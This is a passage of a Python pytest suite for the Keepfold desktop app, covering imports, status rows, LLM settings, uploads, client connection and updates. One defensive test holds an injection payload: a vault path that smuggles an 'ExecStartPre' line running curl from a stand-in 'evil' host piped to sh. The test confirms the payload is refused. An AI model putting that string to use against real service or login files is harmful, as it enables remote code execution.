    assert wait_job(app)["error"] is None


def test_notes_and_calendar_imports_count_and_mark_history(app, home, vault, tmp_path):
    """QA 5 and 8: notes and calendar imports show on their cards like chat imports do (the
    page marks Add your history done from any count); a plain folder is "notes", once."""
    _, s, _, _ = call(app, "GET", "/api/setup")
    assert s["imports"]["notes"] == {"count": 0, "when": None}
    assert s["imports"]["calendar"] == {"count": 0, "when": None}
    plain = tmp_path / "plain"
    plain.mkdir()
    for n in ("one", "two"):
        (plain / f"{n}.md").write_text(f"# {n}\n\nbody {n}\n", encoding="utf-8")
    call(app, "POST", "/api/import/preview", {"source": "notes", "path": str(plain)})
    assert wait_job(app)["result"]["lines"] == ["Found 2 new notes."]
    call(app, "POST", "/api/import/run", {"source": "notes", "path": str(plain)})
    assert wait_job(app)["result"]["lines"][0].startswith("Imported 2 notes into ")
    call(app, "POST", "/api/import/run", {"source": "calendar",
                                          "path": str(EXPORTS / "calendar.ics")})
    wait_job(app)
    _, s, _, _ = call(app, "GET", "/api/setup")
    assert s["imports"]["notes"]["count"] == 2 and s["imports"]["calendar"]["count"] == 3
    assert s["imports"]["notes"]["when"] and s["imports"]["calendar"]["when"]
    assert s["imports"]["chatgpt"]["count"] == 0  # chat cards unchanged


def test_docs_repos_and_highlights_cards(app, home, vault, tmp_path):
    """v9 item 14: the three new cards preview (dry run, tier preselected), import at the
    page's tier, and count on their cards."""
    from test_more_sources import CLIPPINGS, _docs_folder, _repo
    _, s, _, _ = call(app, "GET", "/api/setup")
    assert {"docs", "repos", "highlights"} <= set(s["guides"])
    assert s["imports"]["repos"] == {"count": 0, "when": None}
    docs, clip = _docs_folder(tmp_path / "docs"), tmp_path / "My Clippings.txt"
    clip.write_bytes(CLIPPINGS.encode("utf-8"))
    _repo(tmp_path / "projects", "planner")
    before = snapshot(vault / "resources")
    for source, path, n in (("docs", docs, 3), ("repos", tmp_path / "projects", 1),
                            ("highlights", clip, 2)):
        call(app, "POST", "/api/import/preview", {"source": source, "path": str(path)})
        r = wait_job(app)["result"]
        assert r["found"] == n and r["tier"] == "cloud" and r["lines"][0].startswith(
            f"Found {n} new item"), r
    assert snapshot(vault / "resources") == before
    call(app, "POST", "/api/import/run", {"source": "repos", "path": str(tmp_path / "projects"),
                                          "tier": "local"})
    assert wait_job(app)["result"]["counts"] == {"repos": 1}
    assert "private: true" in (vault / "resources" / "repo-planner.md").read_text("utf-8")
    call(app, "POST", "/api/import/run", {"source": "highlights", "path": str(clip)})
    assert wait_job(app)["result"]["counts"] == {"highlights": 2}
    call(app, "POST", "/api/import/preview", {"source": "highlights", "path": str(docs)})
    assert "not reading highlights: use the Notes card" in wait_job(app)["error"]
    _, s, _, _ = call(app, "GET", "/api/setup")
    assert s["imports"]["repos"]["count"] == 1 and s["imports"]["highlights"]["count"] == 2


def test_last_indexed_is_one_answer(app, vault):
    """QA 4: Setup's "Index my notes", Status and Dashboard and vault read the same file (the
    vector cache Index my notes writes), so they never disagree."""
    from keepfold import semantic

    def seen():
        _, s, _, _ = call(app, "GET", "/api/setup")
        _, v, _, _ = call(app, "GET", "/api/vault")
        _, st, _, _ = call(app, "GET", "/api/status")
        row = next(r for r in st["rows"] if r["id"] == "vault")
        return s["embed"]["indexed"], v["last_index"], row["detail"]

    (vault / ".keepfold" / "index-snapshot.json").write_text("{}", encoding="utf-8")
    assert seen() == (None, None, "Last indexed not yet.")  # the count is its own label
    (vault / semantic.CACHE).write_bytes(b"x")
    a, b, detail = seen()
    assert a and a == b and detail == f"Last indexed {a}."


def test_doctor_in_the_app_points_at_setup_not_at_keepfold_app(app, vault):
    """QA 8: inside the app, "Run `keepfold app`" is circular; the fix names the Setup step.
    The CLI's own doctor output keeps its wording."""
    from keepfold import doctor

    class Job:
        def say(self, line):
            pass

    lines = actions.doctor(Job(), vault)["lines"]
    assert not any("keepfold app" in x or "Start menu" in x for x in lines), lines
    assert "      fix: in this app, Setup → Search model → Download search model." in lines
    assert "keepfold app" in doctor.check_search_model()[3]


def test_capture_takes_only_its_own_threads_output(capsys):
    """Audit 21 Nov A8: while a job runs, another thread's print (the HTTP server, the update
    check) stays on the console and out of the job's lines."""
    import typer

    said, started, printed = [], threading.Event(), threading.Event()

    class Job:
        def say(self, line):
            said.append(line)

    def other():
        started.wait(5)
        print("from another thread")
        printed.set()

    def fn():
        print("job print")
        started.set()
        printed.wait(5)
        typer.echo("job echo")
        typer.echo("job err", err=True)

    t = threading.Thread(target=other)
    t.start()
    out = actions.capture(Job(), fn)
    t.join()
    assert out == {"ok": True, "lines": ["job print", "job echo", "job err"]}, out
    assert said == out["lines"]
    assert "from another thread" in capsys.readouterr().out


def test_llm_settings_refuse_no_model_but_keep_the_switch(app):
    """QA 6: Save with no model is refused (never `model: null`); the on/off switch alone
    still saves; the page gets Ollama's state in Setup's words."""
    from keepfold import taint
    call(app, "POST", "/api/llm/settings", {"model": "qwen3.5:4b", "runner": "ollama"})
    for bad in ({"model": None}, {"model": ""}, {"model": None, "runner": "ollama"}):
        code, body, _, _ = call(app, "POST", "/api/llm/settings", bad)
        assert code == 400 and body["error"] == "Choose a model first.", bad
    assert call(app, "POST", "/api/llm/settings", {"enabled": False})[0] == 200
    assert taint.config()["localllm"] == {"model": "qwen3.5:4b", "runner": "ollama",
                                          "enabled": False}


@pytest.mark.parametrize("exe,want", [(None, "not_installed"), ("C:/ollama.exe", "stopped")])
def test_llm_page_says_ollama_state_like_setup(app, monkeypatch, exe, want):
    monkeypatch.setattr(status, "ollama_models", lambda: None)
    monkeypatch.setattr(wizard, "ollama_exe", lambda: exe)
    _, llm, _, _ = call(app, "GET", "/api/llm")
    _, s, _, _ = call(app, "GET", "/api/setup")
    assert llm["ollama_state"] == s["runner"]["ollama"]["state"] == want


def test_claude_code_plugin_route_is_labelled_as_commands(vault, monkeypatch):
    """QA 8: Claude Code's plugin route shows commands, not a config entry."""
    from keepfold import clients
    monkeypatch.setattr(targets.ClaudeCode, "_plugin_route", lambda self: True)
    base = clients.server_entry("keepfold", vault)
    rows = {t["id"]: t for t in targets.describe(base)}
    assert rows["claude-code"]["commands"] is True
    assert rows["claude-code"]["snippet"].startswith("claude plugin ")
    assert not any(t.get("commands") for i, t in rows.items() if i != "claude-code")


@pytest.mark.parametrize("source,name,card", [
    ("claude", "notion", "Notes card"), ("perplexity", "obsidian", "Notes card"),
    ("chatgpt", "calendar.ics", "Calendar card"),
    ("gemini", "takeout_MyActivity.json", "Google activity card"),
    ("notes", "chatgpt_conversations.json", "ChatGPT"),
])
def test_a_card_refuses_another_kind_and_names_the_right_card(app, vault, source, name, card):
    """R3-1: a Notion folder in the Claude guide is not imported as Perplexity chats."""
    from keepfold import chats
    call(app, "POST", "/api/import/preview", {"source": source, "path": str(EXPORTS / name)})
    job = wait_job(app)
    assert job["result"] is None and card in job["error"], job
    assert not chats.export_root().exists() or not list(chats.export_root().rglob("*.jsonl"))


def test_uploaded_my_activity_is_still_google_activity(app, vault):
    """An upload keeps a cleaned copy of its name, so `detect` tells MyActivity.json apart
    from a chat export's single .json file, as `keepfold import` does with the real name."""
    data = (EXPORTS / "takeout_MyActivity.json").read_bytes()
    _, up = upload(app, data, "MyActivity.json")
    call(app, "POST", "/api/import/preview", {"source": "google-activity",
                                              "upload": up["upload"]})
    job = wait_job(app)
    assert job["error"] is None and job["result"]["found"] >= 1


def test_html_my_activity_uploads_for_google_activity_and_gemini(app, vault):
    """G6: Takeout's HTML is read, so the page takes .html and no hint asks for JSON."""
    from keepfold.browse import takeout
    html = EXPORTS / "takeout_html" / "Takeout" / "My Activity"
    for card, sub in (("google-activity", "Search"), ("gemini", "Gemini Apps")):
        status, up = upload(app, (html / sub / "MyActivity.html").read_bytes(),
                            "MyActivity.html")
        assert status == 200, up
        call(app, "POST", "/api/import/preview", {"source": card, "upload": up["upload"]})
        job = wait_job(app)
        assert job["error"] is None, job
    assert "English" in takeout.READ_HINT and "export again" not in takeout.READ_HINT
    js = (Path(__file__).parents[1] / "src/keepfold/assets/app/app.js").read_text("utf-8")
    assert ".html" in js[js.index("id: 'imp-file'"):][:120]


def test_chat_preview_and_import_copy(app, home):
    """R3-9: no "(those are updated)" after 0, and no /keepfold hint while no app is connected."""
    path = str(EXPORTS / "chatgpt_conversations.json")
    call(app, "POST", "/api/import/preview", {"source": "chatgpt", "path": path})
    line = wait_job(app)["result"]["lines"][0]
    assert "updated" not in line and "0 already" not in line
    call(app, "POST", "/api/import/run", {"source": "chatgpt", "path": path})
    line = wait_job(app)["result"]["lines"][0]
    assert "Connect an AI app" in line and "In Claude, type" not in line
    call(app, "POST", "/api/import/preview", {"source": "chatgpt", "path": path})
    assert "already imported (those are updated)" in wait_job(app)["result"]["lines"][0]


def test_google_activity_preview_says_the_search_model_is_needed(app, monkeypatch):
    """R3-3: the need shows at Check, not after Import, and the result is not ok."""
    from keepfold.browse import sources
    monkeypatch.setattr(sources, "discover", lambda *a, **k: [])
    call(app, "POST", "/api/import/preview", {"source": "google-activity",
                                              "path": str(EXPORTS / "takeout_MyActivity.json")})
    r = wait_job(app)["result"]
    assert r["need"] == "embed" and r["ok"] is False and r["found"] >= 1
    js = (server.ASSETS / "app.js").read_text(encoding="utf-8")
    assert "stopped: needs the search model" in js  # the job bar never says done for it


def test_voice_memos_ask_to_install_then_count_without_transcribing(app, vault, tmp_path,
                                                                     monkeypatch):
    """Voice memos: without the speech model, Check asks to install it (nothing downloads);
    with it, Check counts the recordings and only Import transcribes them."""
    from types import SimpleNamespace

    from keepfold import voice_memos
    d = tmp_path / "Recordings"
    d.mkdir()
    (d / "20241103 memo.m4a").write_bytes(b"audio")
    monkeypatch.setattr(voice_memos, "load_transcriber", lambda: None)
    call(app, "POST", "/api/import/preview", {"source": "voice-memos", "path": str(d)})
    r = wait_job(app)["result"]
    assert r["need"] == "voice" and r["ok"] is False and "~150 MB" in r["lines"][0]
    calls = []

    def fake(path, prompt):
        calls.append(path.name)
        return 9, [SimpleNamespace(start=0, text="A note about the lab report.",
                                   no_speech_prob=0.0, avg_logprob=-0.2)]
    monkeypatch.setattr(voice_memos, "load_transcriber", lambda: fake)
    call(app, "POST", "/api/import/preview", {"source": "voice-memos", "path": str(d)})
    r = wait_job(app)["result"]
    assert r["found"] == 1 and r["tier"] == "local" and not calls
    call(app, "POST", "/api/import/run", {"source": "voice-memos", "path": str(d)})
    job = wait_job(app)
    assert job["error"] is None and job["result"]["counts"] == {"voice-memos": 1}
    assert calls == ["20241103 memo.m4a"]
    (page,) = (vault / "resources").glob("voice-2024-11-03-*.md")
    assert "private: true" in page.read_text("utf-8")


def test_anki_card_uploads_an_export_previews_and_imports(app, vault, tmp_path):
    """R22: the Anki card takes an uploaded .apkg (and .colpkg), asks the tier, and imports one
    page per deck, linked to its parent deck's, as `keepfold import` does."""
    from test_anki_import import _legacy_apkg

    from keepfold import importers
    _, s, _, _ = call(app, "GET", "/api/setup")
    assert s["guides"]["anki"]["steps"] == importers.GUIDES["anki"]["steps"]
    assert upload(app, b"PK", "decks.colpkg")[0] == 200
    code, up = upload(app, _legacy_apkg(tmp_path).read_bytes(), "Physics.apkg")
    assert code == 200
    call(app, "POST", "/api/import/preview", {"source": "anki", "upload": up["upload"]})
    r = wait_job(app)["result"]
    assert r["found"] == 2 and r["tier"] == "cloud" and not list(vault.glob("resources/deck-*"))
    call(app, "POST", "/api/import/run", {"source": "anki", "upload": up["upload"]})
    job = wait_job(app)
    assert job["error"] is None and job["result"]["counts"] == {"anki": 2}
    page = (vault / "resources" / "deck-anki-physics-optics.md").read_text("utf-8")
    assert "[[deck-anki-physics]]" in page and "## Leeches" in page


def test_cloud_on_needs_provider_model_and_variable(app, home):
    """R3-4: "on" is refused until each is filled, naming what is missing; off saves."""
    from keepfold import taint
    full = {"cloud_processing": True, "provider": "openai", "model": "gpt-x",
            "api_key_env": "OPENAI_API_KEY"}
    for gone, word in (("provider", "provider"), ("model", "model"),
                       ("api_key_env", "variable")):
        code, js, _, _ = call(app, "POST", "/api/browse/cloud", {**full, gone: ""})
        assert code == 400 and word in js["error"], gone
    code, js, _, _ = call(app, "POST", "/api/browse/cloud", {**full, "provider": "custom"})
    assert code == 400 and "Base URL" in js["error"]
    for bad in ("PATH", "HOME", "USERPROFILE", "openai_api_key"):  # S10
        assert call(app, "POST", "/api/browse/cloud", {**full, "api_key_env": bad})[0] == 400
    assert "cloudllm" not in taint.config()
    assert call(app, "POST", "/api/browse/cloud", {"cloud_processing": False})[0] == 200
    assert call(app, "POST", "/api/browse/cloud", full)[0] == 200
    js = (server.ASSETS / "app.js").read_text(encoding="utf-8")
    assert "'e.g. gpt-4o-mini'" in js and "'e.g. OPENAI_API_KEY'" in js


@pytest.mark.parametrize("systemd", [True, False])
def test_login_entry_refuses_newlines_and_escapes_dollar(monkeypatch, home, systemd):
    """r1 S5: a vault path cannot add a line to the unit or the .desktop entry; `$` is
    literal in the systemd unit ($$)."""
    import sys
    from pathlib import PurePosixPath
    monkeypatch.setattr(sys, "platform", "linux")
    monkeypatch.setattr(status, "_systemd", lambda: systemd)
    bad = PurePosixPath("/home/u/vault\nExecStartPre=/bin/sh -c 'curl evil|sh'\n#")
    with pytest.raises(ValueError):
        status.login_text(bad)
    assert "ExecStartPre" not in status.login_shown(bad)  # the page shows the refusal
    text = status.login_text(PurePosixPath("/home/u/${HOME} $x"))
    assert ('"/home/u/$${HOME} $$x"' if systemd else '"/home/u/\\\\${HOME} \\\\$x"') in text
    monkeypatch.setattr(sys, "platform", "darwin")
    with pytest.raises(ValueError):
        status.login_text(PurePosixPath("/Users/u/v\x00"))


def test_uploads_are_private_and_old_ones_swept_at_start(app, home):
    """r1 S7: an upload is 0600 (POSIX), and a start removes uploads a killed app left."""
    import os
    import sys
    _, up = upload(app, b"[]", "a.json")
    p = app.uploads[up["upload"]]
    if sys.platform != "win32":
        assert p.stat().st_mode & 0o777 == 0o600
    old = actions.tmp_dir() / "upload-0123456789abcdef.zip"
    old.write_bytes(b"x")
    os.utime(old, (time.time() - 2 * 86400,) * 2)
    srv, _ = server.make_server(None)
    srv.server_close()
    assert not old.exists() and p.exists()


def test_a_vault_error_in_a_job_shows_its_message(app):
    """r4 F4: VaultError text is written for users; other errors stay type-only."""
    from keepfold.vault import VaultError

    def boom(job):
        raise VaultError("invalid_argument", "Found no .ics calendar in x.zip.")
    app.jobs.start("Boom", "setup", boom, quiet_errors=True)
    assert wait_job(app)["error"] == "Found no .ics calendar in x.zip."


def test_status_has_an_ai_apps_row(app):
    """R3-10: Status says whether any AI app is connected."""
    _, js, _, _ = call(app, "GET", "/api/status")
    r = next(r for r in js["rows"] if r["id"] == "apps")
    assert r["state"] == "off" and r["action"]["go"] == "connect"


def _install(home) -> Path:
    """A fake KeepfoldSetup.exe install in the installer's default folder; its bin\\keepfold.exe."""
    d = home / "LOCALAPPDATA" / "Programs" / "Keepfold"
    (d / "bin").mkdir(parents=True)
    (d / "keepfold-install.txt").write_text("x", encoding="utf-8")
    (d / "bin" / "keepfold.exe").write_bytes(b"")
    return d / "bin" / "keepfold.exe"


def test_status_says_when_a_mac_has_keepfolds_notifications_off(vault):
    """Owner, 28 Nov: a row on Status only while macOS has Keepfold's notifications turned off."""
    from keepfold.app import desktop
    assert "notify" not in [r["id"] for r in status.rows(vault)]
    desktop.save_state("notify_denied", True)
    row = next(r for r in status.rows(vault) if r["id"] == "notify")
    assert (row["state"], row["value"]) == ("warn", "off in System Settings")
    desktop.save_state("notify_denied", False)
    assert "notify" not in [r["id"] for r in status.rows(vault)]


@pytest.mark.skipif(sys.platform != "win32",
                    reason="KeepfoldSetup.exe and the Store Claude Desktop's Claude-Data folder")
def test_connect_points_claude_desktop_at_the_installed_keepfold_and_repairs_a_stale_copy(
        app, home, vault):
    """D7: one Keepfold version. A `uv tool` copy in the Claude Desktop config is reported on
    Status and Apply under Connect rewrites only its entry (backup first, other keys kept)."""
    exe = _install(home)
    cfg = home / "LOCALAPPDATA" / "Claude-Data" / "claude_p1" / "claude_desktop_config.json"
    cfg.parent.mkdir(parents=True)
    tool = str(home / ".local" / "bin" / "keepfold.exe")
    old = {"theme": "dark", "mcpServers": {
        "other": {"command": "x", "args": ["y"]},
        "keepfold": {"command": tool, "args": ["mcp", "--vault", str(vault)]}}}
    cfg.write_text(json.dumps(old), encoding="utf-8")

    row = next(r for r in status.rows(vault) if r["id"] == "apps")
    assert row["state"] == "warn" and "different copy of Keepfold" in row["value"]
    assert str(cfg) in row["detail"] and row["action"] == {"go": "connect", "label": "Fix"}

    want = {"claude-desktop": True}
    _, plan, _, _ = call(app, "POST", "/api/connect/plan", {"want": want})
    assert [(r["id"], r["change"]) for r in plan["rows"]] == [("claude-desktop", "update")]
    assert call(app, "POST", "/api/connect/apply", {"want": want})[0] == 200
    assert wait_job(app)["error"] is None
    got = json.loads(cfg.read_text(encoding="utf-8"))
    assert got["theme"] == "dark" and got["mcpServers"]["other"] == old["mcpServers"]["other"]
    assert got["mcpServers"]["keepfold"] == {"command": str(exe),
                                           "args": ["mcp", "--vault", str(vault.resolve())]}
    assert [json.loads(b.read_text(encoding="utf-8"))
            for b in cfg.parent.glob(cfg.name + ".keepfold-*.bak")] == [old]
    assert not list(cfg.parent.glob("*.tmp"))
    assert next(r for r in status.rows(vault) if r["id"] == "apps")["state"] != "warn"


def test_without_an_install_connect_keeps_the_keepfold_on_path(app, home, vault, monkeypatch):
    monkeypatch.setattr("keepfold.clients.keepfold_command", lambda: "/abs/keepfold")
    assert clients.installed_keepfold() is None
    assert app.entry()["command"] == "/abs/keepfold"
    assert not clients.other_copy({"command": "/elsewhere/keepfold"})  # nothing to repair
    d = home / "LOCALAPPDATA" / "Programs" / "Keepfold"  # a folder without the marker: no install
    (d / "bin").mkdir(parents=True)
    (d / "bin" / "keepfold.exe").write_bytes(b"")
    assert clients.installed_keepfold() is None
    (d / "keepfold-install.txt").write_text("x", encoding="utf-8")
    assert app.entry()["command"] == str(d / "bin" / "keepfold.exe")
    assert not clients.other_copy({"command": str(d / "bin" / "keepfold.exe")})
    assert clients.other_copy({"command": "/elsewhere/keepfold"})


def _history(vault, last=None, hours=6, login=False, keys=("chrome/Default",)):
    """status.history_row with a browse state imported at `last` (None: never imported)."""
    f = vault / ".keepfold" / "browse" / "state.json"
    f.parent.mkdir(parents=True, exist_ok=True)
    f.write_text(json.dumps({"sources": dict.fromkeys(keys, {}),
                             **({"last_run": last} if last else {})}), encoding="utf-8")
    b = {"available": True, "settings": {"auto_import_hours": hours},
         "login": {"supported": True, "exists": login}}
    return status.history_row(vault, b, now=datetime(2026, 11, 19, 12, tzinfo=UTC))


def _found(monkeypatch, home, *keys):
    from keepfold.browse import sources
    monkeypatch.setattr(sources, "discover", lambda *a, **k: [
        sources.Source(*key.split("/"), home / key) for key in keys])


def test_status_browsing_history_row(vault, home, monkeypatch):
    """Status warns when history imports stopped (twice auto_import_hours without one), only
    after a first import; auto import off says so; the login hint shows while login is off."""
    _found(monkeypatch, home, "chrome/Default", "comet/Default")
    never = _history(vault)
    assert never["state"] == "off" and never["value"] == "never imported"
    assert "import" not in never and "login_hint" not in never and "at" not in never
    fresh = _history(vault, "2026-11-19T03:00:00Z")  # 9 h ago, under 2 x 6 h
    assert fresh["state"] == "ok" and fresh["at"] == "2026-11-19T03:00:00Z"
    assert fresh["value"] == "last import {ago}" and "import" not in fresh
    assert fresh["login_hint"] is True and fresh["action"]["go"] == "browse"
    stale = _history(vault, "2026-11-17T09:00:00Z")
    assert stale["state"] == "warn" and stale["import"] == ["chrome/Default"]
    assert stale["detail"] == "Last import {ago}: newer visits are not in Keepfold yet."
    assert _history(vault, "2026-11-17T09:00:00Z", login=True)["login_hint"] is False
    off = _history(vault, "2026-11-01T00:00:00Z", hours=0)
    assert off["state"] == "off" and "Automatic import is off" in off["detail"]
    assert off["action"] == {"go": "browse", "label": "Open"} and "import" not in off
    assert "login_hint" not in off
    # no vault, or a broken state: never imported, no error
    assert status.history_row(None, {"available": True})["value"] == "never imported"
    assert _history(vault, "not a time")["value"] == "never imported"


def test_status_import_button_leaves_unticked_profiles_out(vault, home, monkeypatch):
    """Status's Import new history now posts the automatic import's sources: imported before,
    still on this computer, never one unticked (browse.skip_profiles)."""
    _found(monkeypatch, home, "chrome/Default", "comet/Default", "edge/Default")
    cfg = home / ".keepfold" / "config.yaml"
    cfg.parent.mkdir(exist_ok=True)
    cfg.write_text("browse:\n  skip_profiles: [comet/Default]\n", encoding="utf-8")
    keys = ("chrome/Default", "comet/Default", "gone/Default")
    stale = _history(vault, "2026-11-17T09:00:00Z", keys=keys)
    assert stale["state"] == "warn" and stale["import"] == ["chrome/Default"]


def test_status_history_row_through_the_app(app, vault, home, monkeypatch):
    """The /api/status row reads the vault's browse state, and the Run key for the hint."""
    _found(monkeypatch, home, "edge/Default")
    monkeypatch.setattr(status, "login_file", lambda: None)  # the Run key, as on Windows
    f = vault / ".keepfold" / "browse" / "state.json"
    f.parent.mkdir(parents=True, exist_ok=True)
    f.write_text(json.dumps({"last_run": "2026-01-01T00:00:00Z", "sources": {"edge/Default": {}}}),
                 encoding="utf-8")
    r = next(r for r in call(app, "GET", "/api/status")[1]["rows"] if r["id"] == "history")
    assert r["state"] == "warn" and r["import"] == ["edge/Default"] and r["login_hint"] is True
    status.run_set("x")
    r = next(r for r in call(app, "GET", "/api/status")[1]["rows"] if r["id"] == "history")
    assert r["login_hint"] is False


def test_google_activity_html_says_how_many_rows_were_skipped(app, monkeypatch):
    from keepfold.browse import sources, takeout
    monkeypatch.setattr(sources, "discover", lambda *a, **k: [])
    path = EXPORTS / "takeout_html" / "Takeout" / "My Activity" / "Search" / "MyActivity.html"
    call(app, "POST", "/api/import/preview", {"source": "google-activity", "path": str(path)})
    line = wait_job(app)["result"]["lines"][0]
    assert line.endswith("Search 1. 1 row skipped (unreadable date).")
    monkeypatch.setattr(takeout, "records", lambda p: takeout.Rows())
    call(app, "POST", "/api/import/preview", {"source": "google-activity", "path": str(path)})
    err = wait_job(app)["error"]
    assert "some languages are not read yet" in err and "JSON" not in err


# ---- updates: only on a click; the network and the installer are faked ----------------------


def _release(version=(9, 0, 0)):
    tag = "v" + ".".join(map(str, version))
    return {"tag": tag, "version": version, "exe_url": "u", "sha_url": "s",
            "notes_url": f"https://github.com/o/r/releases/tag/{tag}", "exe_size": 32 * 2**20}


@pytest.fixture
def github(monkeypatch):
    from keepfold import update
    launched = []
    monkeypatch.setattr(update, "current", lambda: "0.1.0")
    monkeypatch.setattr(update, "latest", _release)
    monkeypatch.setattr(update, "launch", lambda *a: launched.append(a))
    return launched


def test_update_state_and_status_ask_no_one(app, monkeypatch):
    from keepfold import update
    monkeypatch.setattr(update, "latest", lambda: pytest.fail("a GET went to GitHub"))
    monkeypatch.setattr(update, "current", lambda: "0.1.0")
    want = {"current": "0.1.0", "mode": "dev", "ready": None, "auto": True}
    assert call(app, "GET", "/api/update")[1] == want
    assert call(app, "GET", "/api/status")[1]["update"] == want


def test_update_check_newer_same_and_errors(app, github, monkeypatch):
    from keepfold import update
    assert call(app, "POST", "/api/update/check", {})[0] == 200
    j = wait_job(app)
    r = j["result"]
    assert j["section"] == "update" and r["newer"] and r["latest"] == "9.0.0"
    assert r["current"] == "0.1.0" and r["mode"] == "dev" and r["size"] == 32 * 2**20
    assert r["notes_url"].endswith("/v9.0.0") and r["command"] == update.command("v9.0.0")
    monkeypatch.setattr(update, "latest", lambda: _release((0, 1, 0)))
    call(app, "POST", "/api/update/check", {})
    assert wait_job(app)["result"]["newer"] is False
    monkeypatch.setattr(update, "mode", lambda: "installer")
    call(app, "POST", "/api/update/check", {})
    assert "command" not in wait_job(app)["result"]

    def offline():
        raise update.UpdateError("Could not reach GitHub.")
    monkeypatch.setattr(update, "latest", offline)
    call(app, "POST", "/api/update/check", {})
    assert wait_job(app)["error"] == "Could not reach GitHub."
    assert github == []


def test_update_apply_refuses_a_dev_install_with_the_command(app, github):
    code, js, _, _ = call(app, "POST", "/api/update/apply", {})
    assert code == 400 and "KeepfoldSetup.exe" in js["error"] and "uv tool install" in js["error"]
    assert github == [] and app.jobs.cur is None


def test_update_apply_downloads_launches_and_quits(app, github, monkeypatch, tmp_path):
    from keepfold import update
    got = {}

    def download(info, dest, on_progress, cancel):
        got.update(dest=dest, cancel=cancel)
        on_progress(12 * 2**20, 32 * 2**20)
        time.sleep(0.3)  # long enough for a poll to see the progress line
        exe = tmp_path / "KeepfoldSetup.exe"
        exe.write_bytes(b"MZ")
        return exe
    monkeypatch.setattr(update, "mode", lambda: "installer")
    monkeypatch.setattr(update, "install_dir", lambda: tmp_path / "Keepfold")
    monkeypatch.setattr(update, "download", download)
    seen: list = []
    assert call(app, "POST", "/api/update/apply", {})[0] == 200
    j = wait_job(app, seen)
    assert j["result"]["launched"] is True and j["cancellable"] and j["error"] is None
    assert any(b"downloaded 12 of 32 MB" in raw for raw in seen)
    assert got["dest"] == Path.home() / ".keepfold" / "tmp" / "update-9.0.0"
    assert got["cancel"] is app.jobs.cur.cancelled
    assert github == [(tmp_path / "KeepfoldSetup.exe", os.getpid(), tmp_path / "Keepfold")]
    assert app.stop.wait(5)  # the app quits so the installer can replace its files


def test_update_apply_when_already_latest_or_cancelled(app, github, monkeypatch):
    from keepfold import update
    monkeypatch.setattr(update, "mode", lambda: "installer")
    monkeypatch.setattr(update, "download", lambda *a: None)  # Cancel
    call(app, "POST", "/api/update/apply", {})
    assert wait_job(app)["result"] == {"cancelled": True}
    monkeypatch.setattr(update, "latest", lambda: _release((0, 1, 0)))
    monkeypatch.setattr(update, "download", lambda *a: pytest.fail("downloaded the same version"))
    call(app, "POST", "/api/update/apply", {})
    assert wait_job(app)["result"]["launched"] is False
    assert github == [] and not app.stop.is_set()


def _waiting(version=(9, 0, 0)):
    return {**_release(version), "exe_url": None, "sha_url": None, "exe_size": 0, "waiting": True}


def test_update_check_waiting_release_is_not_ready(app, github, monkeypatch):
    """The Mac or Linux file is attached 20-30 minutes after the release: not offered yet."""
    monkeypatch.setattr(update, "mode", lambda: "app")
    monkeypatch.setattr(update, "latest", _waiting)
    call(app, "POST", "/api/update/check", {})
    r = wait_job(app)["result"]
    assert r["newer"] is False and r["waiting"] is True and "command" not in r
    assert r["note"] == ("Keepfold 9.0.0 is out; the file for this computer is still being "
                         "prepared. Try again in half an hour.")


def test_update_quietly_app_mode_never_downloads(app, github, monkeypatch):
    """D22: on Mac and Linux the background check only notifies; nothing downloads unasked."""
    from types import SimpleNamespace
    monkeypatch.setattr(update, "mode", lambda: "app")
    monkeypatch.setattr(update, "download", lambda *a: pytest.fail("downloaded in the background"))
    notes = []
    app.desktop = SimpleNamespace(notify=notes.append, win=None)
    monkeypatch.setattr(update, "latest", lambda: _waiting((9, 1, 0)))
    app.update_quietly()  # its file is still being built: not told
    assert notes == [] and app.update_ready is None
    monkeypatch.setattr(update, "latest", _release)
    app.update_quietly()
    app.update_quietly()  # every 6 hours: told once per version
    assert notes == ["Keepfold 9.0.0 is available"]
    assert app.update_ready is None and github == []


def test_update_apply_app_mode_swaps_and_quits(app, github, monkeypatch, tmp_path):
    """Mac/Linux Update now: the click downloads this computer's file and swaps it in
    (update.install), then the app quits; Programs in use come back for the user's consent, and
    a lower or equal version is never downloaded."""
    monkeypatch.setattr(update, "mode", lambda: "app")
    monkeypatch.setattr(update, "can_replace", lambda: True)
    got, installs = [], []

    def download_asset(info, dest, on_progress, cancel):
        got.append((dest, cancel))
        on_progress(12 * 2**20, 32 * 2**20)
        return tmp_path / "Keepfold-9.0.0-macos-arm64.zip"
    busy = {"busy": [[501, "/Applications/Keepfold.app/Contents/MacOS/keepfold-cli"]],
            "note": "Keepfold is in use by 1 program (...)."}
    monkeypatch.setattr(update, "download_asset", download_asset)
    monkeypatch.setattr(update, "install", lambda a, i, close: installs.append(
        (a, i["version"], close)) or ({} if close else busy))
    call(app, "POST", "/api/update/apply", {})
    r = wait_job(app)["result"]
    assert r["launched"] is False and r["busy"] == busy["busy"] and r["note"] == busy["note"]
    assert not app.stop.is_set()
    assert got[0][0] == Path.home() / ".keepfold" / "tmp" / "update-9.0.0"
    for bad in ("all", [501, "502"], [True]):
        assert call(app, "POST", "/api/update/apply", {"close": bad})[0] == 400
    call(app, "POST", "/api/update/apply", {"close": [501]})
    j = wait_job(app)
    assert j["result"]["launched"] is True and j["cancellable"]
    assert installs == [(tmp_path / "Keepfold-9.0.0-macos-arm64.zip", (9, 0, 0), []),
                        (tmp_path / "Keepfold-9.0.0-macos-arm64.zip", (9, 0, 0), [501])]
    assert app.stop.wait(5) and github == []  # never the Windows installer


def test_update_apply_app_mode_refuses_a_lower_or_equal_version(app, github, monkeypatch):
    monkeypatch.setattr(update, "mode", lambda: "app")
    monkeypatch.setattr(update, "can_replace", lambda: True)
    monkeypatch.setattr(update, "download_asset", lambda *a: pytest.fail("downloaded"))
    monkeypatch.setattr(update, "install", lambda *a: pytest.fail("installed"))
    for v in ((0, 0, 9), (0, 1, 0)):
        monkeypatch.setattr(update, "latest", lambda v=v: _release(v))
        call(app, "POST", "/api/update/apply", {})
        assert wait_job(app)["result"]["launched"] is False
    assert not app.stop.is_set()


def test_no_write_access_offers_download(app, github, monkeypatch, tmp_path):
    """Review Focus 3: a standard Mac user cannot change /Applications. Update now offers the
    release page instead of failing, and downloads nothing."""
    from keepfold.app import bundle
    monkeypatch.setattr(update, "mode", lambda: "app")
    monkeypatch.setattr(sys, "platform", "darwin")
    mac_app = tmp_path / "Applications" / "Keepfold.app"
    monkeypatch.setattr(bundle, "app_path", lambda: mac_app)
    monkeypatch.setattr(update, "_writable", lambda p: p != mac_app.parent)
    monkeypatch.setattr(update, "download_asset", lambda *a: pytest.fail("downloaded"))
